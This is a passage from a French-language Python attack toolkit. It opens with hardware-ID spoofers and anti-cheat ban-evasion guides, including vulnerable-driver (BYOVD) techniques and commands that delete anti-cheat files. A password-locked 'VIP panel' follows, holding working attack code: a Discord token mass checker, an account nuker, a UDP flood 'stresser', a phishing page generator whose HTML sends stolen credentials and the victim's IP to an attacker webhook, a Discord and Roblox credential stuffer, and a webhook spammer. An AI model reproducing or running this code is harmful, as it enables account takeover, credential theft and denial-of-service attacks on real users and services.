    banner_s("MINECRAFT SPOOFER")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    appdata = os.environ.get("APPDATA", "")
    mc_path = os.path.join(appdata, ".minecraft")
    import json as _json, uuid, winreg
    profiles_path = os.path.join(mc_path, "launcher_profiles.json")
    if os.path.isfile(profiles_path):
        try:
            with open(profiles_path, "r", encoding="utf-8", errors="ignore") as f:
                data = _json.load(f)
            if "authenticationDatabase" in data: data["authenticationDatabase"] = {}
            if "selectedUser" in data: data["selectedUser"] = {}
            with open(profiles_path, "w", encoding="utf-8") as f:
                _json.dump(data, f, indent=2)
            print(f"  {G}[OK]{RST}  launcher_profiles.json nettoye")
        except Exception as e:
            print(f"  {R}[FAIL]{RST} {e}")
    accounts_path = os.path.join(mc_path, "launcher_accounts.json")
    if os.path.isfile(accounts_path):
        try: os.remove(accounts_path); print(f"  {G}[OK]{RST}  accounts.json supprime")
        except Exception: pass
    try:
        new_guid = str(uuid.uuid4())
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, new_guid)
        winreg.CloseKey(k)
        print(f"  {G}[OK]{RST}  GUID -> {new_guid[:20]}...")
    except Exception as e:
        print(f"  {R}[FAIL]{RST} {e}")
    print(f"\n  {Y}Etapes:{RST} nouveau compte MS + launcher alternatif")
    pause()


def hwid_mac_spoof():
    banner_s("MAC ADDRESS SPOOFER")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    try:
        out = subprocess.run(["getmac", "/v", "/fo", "list"],
                             capture_output=True, text=True)
        print(f"  {DIM}{out.stdout[:800]}{RST}")
    except Exception: pass
    iface = input(f"\n  {W}Interface (ex: Ethernet, Wi-Fi): {RST}").strip()
    mac_parts = [random.randint(0, 255) for _ in range(6)]
    mac_parts[0] = (mac_parts[0] & 0xFC) | 0x02
    new_mac = "".join(f"{b:02X}" for b in mac_parts)
    new_mac_display = ":".join(f"{b:02X}" for b in mac_parts)
    print(f"\n  {Y}Nouvelle MAC: {G}{new_mac_display}{RST}\n")
    apply = input(f"  {W}Appliquer via registre? (y/n): {RST}").strip().lower()
    if apply == "y":
        try:
            import winreg
            subprocess.run(["netsh", "interface", "set", "interface", iface, "disable"],
                           capture_output=True)
            time.sleep(1)
            net_key = r"SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, net_key)
            count = winreg.QueryInfoKey(k)[0]
            for i in range(count):
                try:
                    sub = winreg.EnumKey(k, i)
                    sk = winreg.OpenKey(k, sub, 0, winreg.KEY_ALL_ACCESS)
                    try:
                        desc, _ = winreg.QueryValueEx(sk, "DriverDesc")
                        if iface.lower() in desc.lower() or desc.lower() in iface.lower():
                            winreg.SetValueEx(sk, "NetworkAddress", 0,
                                              winreg.REG_SZ, new_mac)
                            print(f"  {G}[OK]{RST}  Registry MAC set pour {desc}")
                    except Exception: pass
                    winreg.CloseKey(sk)
                except Exception: pass
            winreg.CloseKey(k)
            time.sleep(1)
            subprocess.run(["netsh", "interface", "set", "interface", iface, "enable"],
                           capture_output=True)
            print(f"  {G}[OK]{RST}  Interface re-activee.")
        except Exception as e:
            print(f"  {R}[FAIL]{RST} {e}")
    pause()


def hwid_volume_serial():
    banner_s("VOLUME SERIAL SPOOFER")
    try:
        out = subprocess.run(["vol", "C:"], capture_output=True, text=True, shell=True)
        print(f"  {W}{out.stdout.strip()}{RST}")
    except Exception: pass
    print(f"""\n{Y}Methodes:{RST}
{G}[1]{RST} VolumeID (Sysinternals)  https://learn.microsoft.com/sysinternals/downloads/volumeid
    {DIM}volumeid.exe C: ABCD-1234{RST}
{G}[2]{RST} Drive ChangeSerial  https://www.drivechangeserial.com
{G}[3]{RST} Reinstall Windows (fresh)
{Y}Nouveau serial:{RST} {G}{random.randint(0x1000, 0xFFFF):04X}-{random.randint(0x1000, 0xFFFF):04X}{RST}
""")
    pause()


def hwid_registry_clean():
    banner_s("REGISTRY HWID CLEANER")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    import winreg, uuid as _uuid
    cleanup_keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Setup",
         ["InstallationID"]),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\SQMClient", ["MachineId"]),
    ]
    for hive, path, values in cleanup_keys:
        try:
            k = winreg.OpenKey(hive, path, 0, winreg.KEY_ALL_ACCESS)
            if values:
                for v in values:
                    try:
                        new_val = str(_uuid.uuid4()).upper()[:20]
                        winreg.SetValueEx(k, v, 0, winreg.REG_SZ, new_val)
                        print(f"  {G}[OK]{RST}  {path}\\{v} random")
                    except Exception: pass
            winreg.CloseKey(k)
        except Exception: pass
    for mru in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"]:
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, mru, 0, winreg.KEY_ALL_ACCESS)
            try:
                while True:
                    name, _, _ = winreg.EnumValue(k, 0)
                    winreg.DeleteValue(k, name)
            except Exception: pass
            winreg.CloseKey(k)
            print(f"  {G}[OK]{RST}  MRU {mru.split(chr(92))[-1]} nettoye")
        except Exception: pass
    print(f"\n{OK} Registry clean termine.")
    pause()


def hwid_discord_clean():
    banner_s("DISCORD FINGERPRINT CLEANER")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    appdata = os.environ.get("APPDATA", "")
    discord_paths = {"Discord": os.path.join(appdata, "Discord"),
                     "Discord PTB": os.path.join(appdata, "discordptb"),
                     "Discord Canary": os.path.join(appdata, "discordcanary")}
    targets_del = ["Local Storage", "Session Storage", "Cache", "Code Cache",
                   "GPUCache", "logs", "Crashpad", "Network", "Cookies"]
    cleaned = 0
    for name, path in discord_paths.items():
        if not os.path.isdir(path): continue
        print(f"\n  {INF} {name}...")
        for t in targets_del:
            tp = os.path.join(path, t)
            if os.path.isdir(tp):
                try: shutil.rmtree(tp); cleaned += 1
                except Exception: pass
            elif os.path.isfile(tp):
                try: os.remove(tp); cleaned += 1
                except Exception: pass
    print(f"\n{OK} {cleaned} elements Discord supprimes.")
    pause()


def hwid_browser_clean():
    banner_s("BROWSER FINGERPRINT CLEANER")
    if platform.system() != "Windows":
        print(f"{ERR} Windows uniquement."); pause(); return
    localdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    browsers = {"Chrome": os.path.join(localdata, "Google", "Chrome", "User Data", "Default"),
                "Edge": os.path.join(localdata, "Microsoft", "Edge", "User Data", "Default"),
                "Brave": os.path.join(localdata, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
                "Opera": os.path.join(appdata, "Opera Software", "Opera Stable")}
    targets = ["Cookies", "History", "Login Data", "Web Data", "Network",
               "Cache", "Code Cache", "GPUCache", "Local Storage", "Session Storage"]
    total = 0
    for browser, path in browsers.items():
        if not os.path.exists(path): continue
        print(f"\n  {INF} {browser}...")
        for t in targets:
            tp = os.path.join(path, t)
            if os.path.isfile(tp):
                try: os.remove(tp); total += 1
                except Exception: pass
            elif os.path.isdir(tp):
                try: shutil.rmtree(tp); total += 1
                except Exception: pass
    print(f"\n{OK} {total} fichiers browser supprimes.")
    pause()


def hwid_guide():
    banner_s("GUIDE SPOOF MANUEL")
    print(f"""\n{R}+--[ GUIDE BYPASS BAN HWID COMPLET ]----------------+{RST}
{Y}NIVEAU 1 -- Soft Ban{RST}
{G}1.{RST} Changer IP (VPN)
{G}2.{RST} Nouveau compte + email
{G}3.{RST} Vider AppData du jeu
{G}4.{RST} Changer Machine GUID
{G}5.{RST} Changer MAC

{Y}NIVEAU 2 -- Hard Ban (EAC, BattlEye){RST}
{G}1.{RST} Tout niveau 1
{G}2.{RST} Changer Volume Serial (VolumeID)
{G}3.{RST} Changer BIOS Serial
{G}4.{RST} Changer Disk Serial
{G}5.{RST} Nettoyer logs + prefetch
{G}6.{RST} Nouveau profil Windows

{Y}NIVEAU 3 -- Kernel Ban (Vanguard, FACEIT){RST}
{G}1.{RST} Fresh Windows install OBLIGATOIRE
{G}2.{RST} Nouvelle carte reseau / SSD si possible
{G}3.{RST} VPN IP propre
{G}4.{RST} Nouveau compte + tel

{Y}OUTILS:{RST}
{G}->{RST} VolumeID (Sysinternals)
{G}->{RST} Technitium MAC
{G}->{RST} ProxyCap / Proxifier
{R}+----------------------------------------------------+{RST}
""")
    pause()


def hwid_generate_random():
    banner_s("RANDOM HWID GENERATOR")
    import uuid as _uuid
    def rand_mac():
        return ":".join([f"{random.randint(0, 255):02X}" for _ in range(6)])
    def rand_serial(length=20):
        return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
    def rand_guid():
        return str(_uuid.uuid4()).upper()
    def rand_vol():
        return (f"{''.join(random.choices('0123456789ABCDEF', k=4))}-"
                f"{''.join(random.choices('0123456789ABCDEF', k=4))}")
    def rand_hostname():
        prefixes = ["DESKTOP", "LAPTOP", "PC", "MSI", "ASUS", "LENOVO"]
        return f"{random.choice(prefixes)}-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=6))}"
    print(f"\n  {R}+--[ GENERATED FAKE HWID PROFILE ]-----------+{RST}\n")
    profile = {
        "MachineGUID":       rand_guid(),
        "MAC Address 1":     rand_mac(),
        "Disk Serial":       rand_serial(20),
        "Volume Serial C:":  rand_vol(),
        "BIOS Serial":       rand_serial(12),
        "Hostname":          rand_hostname(),
        "Product ID":        "-".join("".join(random.choices('0123456789', k=5)) for _ in range(4)),
    }
    for k, v in profile.items():
        print(f"  {Y}{k:<22}{RST}: {G}{v}{RST} ")
    reg_content = (f"""Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography]
"MachineGuid"="{profile['MachineGUID']}"
[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName]
"ComputerName"="{profile['Hostname']}"
""")
    save_out("hwid_fake_profile.txt",
             "\n".join(f"{k}: {v}" for k, v in profile.items()))
    save_out("apply_fake_hwid.reg", reg_content)
    print(f"\n{OK} Profil genere + .reg pret.")
    pause()


def hwid_windows_spoof():
    banner_s("WINDOWS IDENTITY SPOOFER")
    import uuid as _uuid
    def run(cmd):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, shell=True, timeout=10)
            return r.stdout.strip(), r.returncode
        except Exception:
            return " ", 1
    def rand_guid(): return str(_uuid.uuid4()).upper()
    targets = [
        ("MachineGUID", f'reg add "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid /t REG_SZ /d "{rand_guid()}" /f'),
        ("ProductId",   f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" /v ProductId /t REG_SZ /d "{"".join(random.choices("0123456789", k=5))}-{"".join(random.choices("0123456789", k=5))}" /f'),
        ("SQMClientID", f'reg add "HKLM\\SOFTWARE\\Microsoft\\SQMClient" /v MachineId /t REG_SZ /d "{{{rand_guid()}}}" /f'),
    ]
    for name, cmd in targets:
        out, rc = run(cmd)
        col = G if rc == 0 else R
        status = "OK" if rc == 0 else "NEED ADMIN"
        print(f"  {col}[{status}]{RST}  {name} ")
    new_hostname = f"DESKTOP-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=7))}"
    _, h_rc = run(f'WMIC ComputerSystem where Name="%COMPUTERNAME%" call Rename Name="{new_hostname}"')
    col = G if h_rc == 0 else Y
    print(f"  {col}[{'OK' if h_rc == 0 else 'NEED ADMIN'}]{RST}  Hostname -> {W}{new_hostname}{RST}")
    print(f"\n{OK} Windows identity spoofed. Reboot recommande.")
    pause()


def hwid_disk_serial_spoof():
    banner_s("DISK SERIAL SPOOFER")
    def run(cmd):
        try:
            return subprocess.run(cmd, capture_output=True, text=True, shell=True,
                                  timeout=8).stdout
        except Exception:
            return " "
    disks = run("wmic diskdrive get Index,Model,SerialNumber,Size /value")
    current = {}
    for line in disks.splitlines():
        if "=" in line:
            k, v = line.split("=", 1)
            k = k.strip(); v = v.strip()
            if k and v: current[k] = v
        elif not line.strip() and current:
            if "SerialNumber" in current:
                print(f"  {Y}[Disk {current.get('Index','?')}]{RST}  "
                      f"{W}{current.get('Model','?')}{RST} ")
                print(f"    Serial: {R}{current.get('SerialNumber','?')}{RST}")
            current = {}
    new_vol_serial = ("".join(random.choices('0123456789ABCDEF', k=4)) + "-" +
                      "".join(random.choices('0123456789ABCDEF', k=4)))
    print(f"""\n  {Y}METHODES:{RST}

  {W}[1] VolumeID (Sysinternals){RST}
  {G}volumeid C: {new_vol_serial}{RST}

  {W}[2] Registre SCSI (software-level){RST}
  {DIM}HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\...\\Logical Unit Id 0{RST}

  {W}[3] SMART spoof via driver filter{RST}
  {DIM}Serial suggere: {''.join(random.choices('0123456789ABCDEF', k=20))}{RST}

  {W}[4] Hardware-level:{RST} nouveau SSD physique
""")
    save_out("disk_serial_spoof_guide.txt", disks)
    print(f"\n{OK} Guide sauvegarde.")
    pause()



def hwid_battleye_bypass():
    banner_s("BATTLEYE BYPASS GUIDE")
    print(f"""\n{R}+--[ BattlEye Bypass ]----------------------------+{RST}
{Y}METHODE 1 -- Soft:{RST}
{G}1.{RST} MAC + IP change
{G}2.{RST} Nouveau compte Steam
{G}3.{RST} MachineGUID + Volume Serial
{G}4.{RST} Supprimer dossier:
   {G}rmdir /s /q "%ProgramFiles%\\Common Files\\BattlEye"{RST}
{G}5.{RST} Logs:
   {G}del /f /q "%APPDATA%\\BattlEye\\*.log"{RST}

{Y}METHODE 2 -- Hard:{RST}
Tout 1 + nouveau SID + Disk Serial + fresh install

{Y}TECHNIQUE AVANCEE -- BYOVD:{RST}
{DIM}Charger driver vulnerable signe Microsoft:{RST}
{G}  -> WinRing0x64.sys{RST}
{G}  -> RTCore64.sys{RST}
{G}  -> dbutil_2_3.sys{RST}
{DIM}Via NtLoadDriver + DeviceIoControl.{RST}
{DIM}Patch callbacks ou cacher module.{RST}

{Y}DMA externe (ultime):{RST}
{DIM}Cheat sur FPGA/Raspberry Pi via PCIe DMA.{RST}
{DIM}BattlEye ne detecte pas le hardware externe.{RST}
{R}+-----------------------------------------------+{RST}
""")
    pause()


def hwid_ban_checker():
    banner_s("BAN STATUS CHECKER")
    def run(cmd):
        try:
            return subprocess.run(cmd, capture_output=True, text=True, shell=True,
                                  timeout=5).stdout
        except Exception:
            return " "
    eac_paths = [os.path.expandvars(r"%ProgramData%\EasyAntiCheat"),
                 os.path.expandvars(r"%LOCALAPPDATA%\EasyAntiCheat")]
    print(f"  {Y}[EasyAntiCheat]{RST} ")
    for p in eac_paths:
        if os.path.exists(p):
            print(f"  {R}[EAC DIR]{RST}  {p} ")
        else:
            print(f"  {DIM}[-] {p}{RST} ")
    print(f"\n  {Y}[BattlEye]{RST} ")
    for p in [os.path.expandvars(r"%ProgramFiles%\Common Files\BattlEye"),
              os.path.expandvars(r"%LOCALAPPDATA%\BattlEye")]:
        if os.path.exists(p): print(f"  {R}[BE DIR]{RST}  {p} ")
        else: print(f"  {DIM}[-] {p}{RST} ")
    print(f"\n  {Y}[Vanguard]{RST} ")
    vg = run(r'reg query "HKLM\SYSTEM\ControlSet001\Services\vgk" /v ErrorControl')
    if "errorcontrol" in vg.lower():
        print(f"  {R}[VANGUARD KERNEL DRIVER ACTIVE]{RST}")
    print(f"\n  {Y}[Roblox]{RST} ")
    rblx_log = os.path.expandvars(r"%LOCALAPPDATA%\Roblox\logs")
    if os.path.exists(rblx_log):
        logs = sorted([f for f in os.listdir(rblx_log) if f.endswith(".log")])[-2:]
        for log in logs:
            with open(os.path.join(rblx_log, log), errors="ignore") as f:
                content = f.read()[-2000:]
            if "banned" in content.lower() or "moderated" in content.lower():
                print(f"  {R}[BAN DETECTED]{RST}  {log} ")
            else:
                print(f"  {G}[CLEAN]{RST}  {log} ")
    pause()


# ========================================================================
# VIP PANEL
# ========================================================================
VIP_HASH = "a342e8ec95fbe3bd18d017cd1bbb60397852c9b5f74e7238de32c78686098e8f"
VIP_ATTEMPTS = {"count": 0}


def vip_login():
    banner_s("VIP PANEL -- ACCES VIP")
    print(f"  {R}[!]{RST} {DIM}Zone VIP. Mot de passe requis.{RST}\n ")
    if VIP_ATTEMPTS["count"] >= 5:
        print(f"  {R}[LOCKED]{RST} Trop de tentatives. Redemarrez.")
        pause(); return False
    pw = input(f"  {R} >{RST} Mot de passe: ").strip()
    h = hashlib.sha256(pw.encode()).hexdigest()
    if h == VIP_HASH:
        VIP_ATTEMPTS["count"] = 0
        return True
    else:
        VIP_ATTEMPTS["count"] += 1
        remaining = 5 - VIP_ATTEMPTS["count"]
        print(f"\n  {R}[WRONG]{RST} {remaining} tentative(s) restante(s). ")
        time.sleep(2); pause(); return False


def vip_menu():
    if not vip_login(): return
    while True:
        opts = [("01", "Mass Token Checker"),
                ("02", "Discord Account Nuker"),
                ("03", "IP Stresser Avance"),
                ("04", "Phishing Page Builder"),
                ("05", "Credential Stuffer"),
                ("06", "Proxy Scraper + Checker"),
                ("07", "Mass Webhook Nuker"),
                ("08", "Discord Grabber Generator"),
                ("09", "RAT Builder"),
                ("10", "QR Code Phishing"),
                ("11", "Mass Token Info"),
                ("12", "Roblox Cookie Mass Checker"),
                ("13", "Mass IP Scanner (CIDR)"),
                ("14", "Email Bomber"),
                ("15", "Keylogger Builder"),
                ("00", "Retour")]
        menu_box("*** VIP PANEL ***", opts)
        c = input(f"  {R}VIP >{RST}  ").strip()
        if c == "01": vip_mass_token_checker()
        elif c == "02": vip_account_nuker()
        elif c == "03": vip_ip_stresser()
        elif c == "04": vip_phishing_builder()
        elif c == "05": vip_credential_stuffer()
        elif c == "06": vip_proxy_scraper()
        elif c == "07": vip_mass_webhook_nuker()
        elif c == "08": vip_grabber_gen()
        elif c == "09": vip_rat_builder()
        elif c == "10": vip_qr_phishing()
        elif c == "11": vip_mass_token_info()
        elif c == "12": vip_roblox_mass_checker()
        elif c == "13": vip_mass_ip_scan()
        elif c == "14": vip_email_bomber()
        elif c == "15": vip_keylogger_builder()
        elif c == "00": break


def vip_mass_token_checker():
    banner_s("MASS TOKEN CHECKER")
    path = input(f"  {W}Fichier tokens .txt: {RST} ").strip()
    if not os.path.isfile(path):
        print(f"{ERR} Fichier introuvable. "); pause(); return
    with open(path, encoding="utf-8", errors="ignore") as f:
        tokens = [l.strip() for l in f if l.strip()]
    print(f"\n{INF} {len(tokens)} tokens...\n ")
    valid = []; invalid = []
    for i, token in enumerate(tokens, 1):
        try:
            r = requests.get("https://discord.com/api/v9/users/@me",
                             headers=_dh(token), timeout=4)
            if r.status_code == 200:
                d = r.json()
                nitro_map = {0: "None", 1: "Classic", 2: "Nitro", 3: "Basic"}
                nitro = nitro_map.get(d.get("premium_type", 0), "?")
                line = (f"[VALID] {d.get('username')}#{d.get('discriminator','0')} | "
                        f"{d.get('email','?')} | Nitro:{nitro} | {token}")
                print(f"  {G}[VALID]{RST}  {W}{d.get('username')}{RST}  "
                      f"{DIM}Nitro:{nitro}{RST} ")
                valid.append(line)
            else:
                invalid.append(token)
                print(f"  {R}[DEAD]{RST}   {DIM}{token[:40]}...{RST} ")
        except Exception:
            invalid.append(token)
            print(f"  {R}[ERR]{RST}    {DIM}{token[:40]}...{RST} ")
        time.sleep(0.2)
    print(f"\n{OK} {G}{len(valid)}{RST} valides / {R}{len(invalid)}{RST} morts. ")
    if valid: save_out("mass_tokens_valid.txt", "\n".join(valid))
    pause()


def vip_account_nuker():
    banner_s("DISCORD ACCOUNT NUKER")
    email = input(f"  {W}Email: {RST} ").strip()
    password = input(f"  {W}Password: {RST} ").strip()
    try:
        r = requests.post("https://discord.com/api/v9/auth/login",
                          json={"login": email, "password": password,
                                "undelete": False, "captcha_key": None},
                          headers={"Content-Type": "application/json",
                                   "User-Agent": "Mozilla/5.0"}, timeout=8)
        d = r.json()
        token = d.get("token")
        if not token:
            print(f"{ERR} Login echoue. ({r.status_code}) {d.get('message','')} ")
            pause(); return
        print(f"{OK} Token: {G}{token[:40]}...{RST} ")
        h = _dh(token)
        me = requests.get("https://discord.com/api/v9/users/@me", headers=h).json()
        print(f"{OK} Compte: {G}{me.get('username')}#{me.get('discriminator','0')}{RST} ")
        if input(f"\n  {R}[!]{RST} Type {BRT}NUKE{RST}: ").strip() != "NUKE":
            pause(); return
        guilds = requests.get("https://discord.com/api/v9/users/@me/guilds",
                              headers=h).json()
        if isinstance(guilds, list):
            for g in guilds:
                if g.get("owner"):
                    requests.delete(f"https://discord.com/api/v9/guilds/{g['id']}", headers=h)
                else:
                    requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{g['id']}", headers=h)
                time.sleep(0.3)
        print(f"\n{OK} Nuke complet. ")
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def vip_ip_stresser():
    banner_s("IP STRESSER AVANCE")
    target = input(f"  {W}Target IP: {RST} ").strip()
    port = int(input(f"  {W}Port: {RST} ").strip() or "80")
    duration = int(input(f"  {W}Duration (s): {RST} ").strip() or "15")
    threads_n = int(input(f"  {W}Threads: {RST} ").strip() or "20")
    print(f"\n{INF} -> {Y}{target}:{port}{RST} | {threads_n} threads | {duration}s\n ")
    stop = {"v": False}; sent_total = [0]
    def flood():
        payload = random._urandom(1024)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while not stop["v"]:
                try:
                    sock.sendto(payload, (target, port)); sent_total[0] += 1
                except Exception: pass
            sock.close()
        except Exception as e:
            print(f"\n  {R}[ERR]{RST} {e}")
    threads_list = [threading.Thread(target=flood, daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end = time.time() + duration
        while time.time() < end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} paquets ", end=" ")
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    stop["v"] = True
    print(f"\n\n{OK} Done. {G}{sent_total[0]}{RST} paquets. ")
    pause()


def vip_phishing_builder():
    banner_s("PHISHING PAGE BUILDER")
    print(f"  {Y}[1]{RST} Discord  {Y}[2]{RST} Steam  {Y}[3]{RST} Roblox  {Y}[4]{RST} Custom")
    choice = input(f"  {W}Template: {RST}").strip()
    webhook = input(f"  {W}Webhook: {RST}").strip()
    redirect = input(f"  {W}Redirect URL: {RST}").strip() or "https://discord.com"
    templates = {
        "1": ("Discord", "#5865F2", "Login to Discord", "Email or Phone", "Password"),
        "2": ("Steam", "#1b2838", "Sign in to Steam", "Steam Account", "Password"),
        "3": ("Roblox", "#cc0000", "Login to Roblox", "Username", "Password"),
        "4": ("Custom", "#000000", "Login", "Username / Email", "Password"),
    }
    t = templates.get(choice, templates["4"])
    name, color, title, f1, f2 = t
    if choice == "4":
        title = input(f"  {W}Title: {RST}").strip() or "Login"
        f1 = input(f"  {W}Field 1: {RST}").strip() or "Username"
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>{title}</title>
<style>
* {{ box-sizing: border-box; margin: 0; padding: 0; }}
body {{ background: {color}; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; }}
.card {{ background: #fff; border-radius: 8px; padding: 40px 36px; width: 100%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }}
h2 {{ text-align: center; color: #222; margin-bottom: 24px; }}
label {{ display: block; color: #555; font-size: 13px; font-weight: 600; margin-bottom: 6px; }}
input {{ width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 5px; font-size: 15px; margin-bottom: 18px; }}
button {{ width: 100%; padding: 13px; background: {color}; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: 700; cursor: pointer; }}
.err {{ color: red; font-size: 13px; text-align: center; margin-top: 10px; display: none; }}
</style>
</head>
<body>
<div class="card">
<h2>{title}</h2>
<form id="loginForm">
<label for="f1">{f1}</label>
<input type="text" id="f1" required autocomplete="off">
<label for="f2">{f2}</label>
<input type="password" id="f2" required>
<button type="submit">Login</button>
<div class="err" id="err">Invalid credentials. Please try again.</div>
</form>
</div>
<script>
const WEBHOOK = "{webhook}";
const REDIRECT = "{redirect}";
document.getElementById("loginForm").addEventListener("submit", async function(e) {{
    e.preventDefault();
    const v1 = document.getElementById("f1").value;
    const v2 = document.getElementById("f2").value;
    let ip = "?";
    try {{ const r = await fetch("https://api.ipify.org?format=json"); const d = await r.json(); ip = d.ip; }} catch (e) {{}}
    try {{
        await fetch(WEBHOOK, {{
            method: "POST",
            headers: {{"Content-Type": "application/json"}},
            body: JSON.stringify({{ embeds: [{{ title: "leak-fr phishing",
                color: 0xFF0000, fields: [
                    {{name: "Site", value: "{name}", inline: true}},
                    {{name: "IP", value: ip, inline: true}},
                    {{name: "{f1}", value: v1}},
                    {{name: "{f2}", value: v2}}
                ]}}] }})
        }});
    }} catch (e) {{}}
    document.getElementById("err").style.display = "block";
    setTimeout(function() {{ window.location.href = REDIRECT; }}, 1500);
}});
</script>
</body>
</html>'''
    os.makedirs("1-Output", exist_ok=True)
    fname = f"phishing_{name.lower()}.html"
    with open(os.path.join("1-Output", fname), "w", encoding="utf-8") as f:
        f.write(html)
    print(f"\n{OK} Page -> {Y}1-Output/{fname}{RST}")
    pause()


def vip_credential_stuffer():
    banner_s("CREDENTIAL STUFFER")
    print(f"  {Y}[1]{RST} Discord  {Y}[2]{RST} Roblox")
    target = input(f"  {W}Target: {RST}").strip()
    combo_path = input(f"  {W}Combo list: {RST}").strip()
    if not os.path.isfile(combo_path):
        print(f"{ERR} Fichier introuvable. "); pause(); return
    with open(combo_path, encoding="utf-8", errors="ignore") as f:
        combos = [l.strip() for l in f if ":" in l]
    print(f"\n{INF} {len(combos)} combos...\n ")
    hits = []
    for combo in combos:
        parts = combo.split(":", 1)
        if len(parts) != 2: continue
        email, password = parts
        try:
            if target == "1":
                r = requests.post("https://discord.com/api/v9/auth/login",
                                  json={"login": email, "password": password},
                                  headers={"Content-Type": "application/json",
                                           "User-Agent": "Mozilla/5.0"}, timeout=5)
                if r.status_code == 200 and r.json().get("token"):
                    tok = r.json()["token"]
                    print(f"  {G}[HIT]{RST}  {W}{email}:{password}{RST} ")
                    hits.append(f"[DISCORD] {email}:{password} | token:{tok}")
                else:
                    print(f"  {DIM}[MISS]{RST} {email} ")
            elif target == "2":
                r = requests.post("https://auth.roblox.com/v2/login",
                                  json={"ctype": "Username", "cvalue": email,
                                        "password": password}, timeout=5)
                if r.status_code == 200:
                    print(f"  {G}[HIT]{RST}  {W}{email}:{password}{RST} ")
                    hits.append(f"[ROBLOX] {email}:{password}")
                else:
                    print(f"  {DIM}[MISS]{RST} {email} ")
        except Exception:
            print(f"  {R}[ERR]{RST}  {email} ")
        time.sleep(0.5)
    print(f"\n{OK} {G}{len(hits)}{RST} hits. ")
    if hits: save_out("credential_hits.txt", "\n".join(hits))
    pause()


def vip_proxy_scraper():
    banner_s("PROXY SCRAPER + CHECKER")
    sources = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ]
    print(f"\n{INF} Scraping {len(sources)} sources...\n ")
    all_proxies = set()
    for src in sources:
        try:
            r = requests.get(src, timeout=8)
            for line in r.text.strip().split("\n"):
                line = line.strip()
                if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}", line):
                    all_proxies.add(line)
            print(f"  {G}[OK]{RST}  {src[:60]} ")
        except Exception as e:
            print(f"  {R}[ERR]{RST} {e} ")
    print(f"\n{OK} {G}{len(all_proxies)}{RST} proxies scraped. ")
    check = input(f"  {W}Checker? (y/n): {RST}").strip().lower() == "y"
    if check:
        working = []
        for proxy in list(all_proxies)[:200]:
            try:
                r = requests.get("http://httpbin.org/ip",
                                 proxies={"http": f"http://{proxy}",
                                          "https": f"http://{proxy}"},
                                 timeout=4)
                if r.status_code == 200:
                    working.append(proxy)
                    print(f"  {G}[WORK]{RST}  {proxy} ")
            except Exception: pass
        print(f"\n{OK} {G}{len(working)}{RST} working. ")
        save_out("proxies_working.txt", "\n".join(working))
    else:
        save_out("proxies_all.txt", "\n".join(all_proxies))
    pause()


def vip_mass_webhook_nuker():
    banner_s("MASS WEBHOOK NUKER")
    path = input(f"  {W}Fichier webhooks .txt: {RST}").strip()
    if not os.path.isfile(path):
        print(f"{ERR} Fichier introuvable. "); pause(); return
    with open(path, encoding="utf-8", errors="ignore") as f:
        hooks = [l.strip() for l in f if l.strip().startswith("https://discord.com/api/webhooks")]
    print(f"\n{INF} {len(hooks)} webhooks. ")
    mode = input(f"  {Y}[1]{RST} Spam  {Y}[2]{RST} Delete  {Y}[3]{RST} Both: ").strip()
    msg = ""
    if mode in ["1", "3"]: msg = input(f"  {W}Message: {RST}").strip()
    count = int(input(f"  {W}Messages/webhook: {RST}").strip() or "5")
    for wh in hooks:
        if mode in ["1", "3"]:
            for i in range(count):
                r = requests.post(wh, json={"content": msg})
                print(f"  {G if r.status_code==204 else R}[SPAM]{RST}  {wh[:50]}  {r.status_code} ")
                time.sleep(0.3)
        if mode in ["2", "3"]:
            r = requests.delete(wh)
